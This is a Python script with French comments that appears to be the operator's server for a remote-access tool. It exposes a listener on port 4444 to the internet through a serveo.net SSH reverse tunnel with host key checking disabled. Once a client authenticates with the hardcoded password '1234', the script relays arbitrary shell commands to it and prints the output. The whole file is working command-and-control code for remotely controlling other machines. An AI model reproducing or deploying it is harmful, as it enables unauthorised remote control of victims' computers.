import socket
import subprocess
import platform
import time
import sys

# --- CONFIGURATION ---
PORT = 4444
PASSWORD = "1234"
# Ton ID spécifique pour garder la même URL
URL_DISTANTE = "103fa379dfd22edd-93-23-16-243" 

def lancer_tunnel_ssh():
    """Lance le tunnel Serveo en arrière-plan"""
    print(f"[*] Tentative d'ouverture du tunnel Serveo sur le port {PORT}...")
    try:
        # Commande SSH pour Serveo
        # -R lie ton port local au serveur distant
        ssh_cmd = [
            "ssh", "-o", "StrictHostKeyChecking=no", 
            "-R", f"{URL_DISTANTE}:80:localhost:{PORT}", 
            "serveo.net"
        ]
        # On lance en arrière-plan
        process = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5) # On laisse le temps au tunnel de s'établir
        print(f"[OK] Tunnel actif : {URL_DISTANTE}.serveousercontent.com")
        return process
    except Exception as e:
        print(f"[!] Erreur SSH : {e}")
        sys.exit(1)

def handle_client(conn, addr):
    print(f"\n[+] CONNEXION REÇUE")
    
    # Réception des infos initiales
    try:
        infos = conn.recv(1024).decode('utf-8')
        print(infos)
        
        conn.sendall(b"AUTH_REQUIRED")
        auth = conn.recv(1024).decode().strip()

        if auth != PASSWORD:
            conn.sendall(b"AUTH_FAILED")
            return

        conn.sendall(b"AUTH_SUCCESS")
        print("[OK] Accès autorisé. Prêt pour les commandes.")

        while True:
            cmd = input(f"RACTT > ").strip()
            if not cmd: continue
            if cmd.lower() == "exit": break

            conn.sendall(cmd.encode())
            reponse = conn.recv(10240).decode() # Buffer plus large pour les retours
            print(f"\n{reponse}")

    except Exception as e:
        print(f"[-] Déconnexion : {e}")

def start_server():
    # 1. On lance le tunnel SSH d'abord
    tunnel = lancer_tunnel_ssh()

    # 2. On lance le serveur Socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(('0.0.0.0', PORT))
            s.listen(5)
            print(f"[*] Serveur local en écoute sur le port {PORT}")
            
            while True:
                conn, addr = s.accept()
                handle_client(conn, addr)
        except KeyboardInterrupt:
            print("\n[*] Fermeture du serveur et du tunnel...")
            tunnel.terminate()

if __name__ == "__main__":
    start_server()
